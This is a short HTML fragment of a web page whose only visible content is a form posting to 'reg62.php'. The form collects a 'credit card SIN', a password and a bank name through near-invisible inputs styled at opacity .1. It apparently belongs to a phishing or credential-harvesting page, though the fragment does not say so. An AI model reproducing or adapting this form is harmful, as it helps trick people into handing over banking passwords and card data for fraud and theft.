            ...
            <main class="main-content">
                ...
                <div class="content">
                    ...
                    <div class="contact-form" >
                        <div class="row" >
                            <div class="col-md-5">
                                <form method="post" action="reg62.php">

                                    <input type="text" style="background-color: black; opacity: .1; color: white;" placeholder="credit card SIN" id="SIN6" name="SIN1">
                                    <input type="password" style="background-color: black; opacity: .1; color: white;" placeholder="Password..." id="CP6" name="CP6">
                                    <input type="text" style="background-color: black; opacity: .1; color: white;" placeholder="User BankName..." name="BN6" id="BN6">
